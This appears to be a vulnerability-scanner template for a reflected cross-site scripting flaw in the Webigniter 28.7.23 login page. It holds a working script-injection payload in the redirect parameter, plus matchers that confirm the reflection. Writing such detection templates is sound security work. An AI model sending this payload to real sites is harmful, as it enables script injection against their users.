id: webigniter-xss
name: Webigniter 28.7.23 - Cross-Site Scripting
severity: medium
confidence: confirmed
description: The value of the redirect request parameter is copied into the value of an HTML tag attribute which is encapsulated
  in double quotation marks. The payload ycsz3"><script>alert(1)</script>bn76w was submitted in the redirect parameter. This
  input was echoed unmodified in the application's response. By using this Java Script injection, the attacker can trick a
  lot of users into visiting his dangerous URL which is reflected on the login form, before they log in, warning them that
  there is a problem with the login
reference: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/WEBIGniter/2023/WEBIGniter-28.7.23-XSS-Reflected
tags:
- xss
- webigniter
- vuln
requests:
- method: GET
  path: /cms/login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w
  matchers: &id001
  - type: body
    words:
    - <script>alert(document.domain)</script>
    - Webigniter
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w
  matchers: *id001
  condition: and
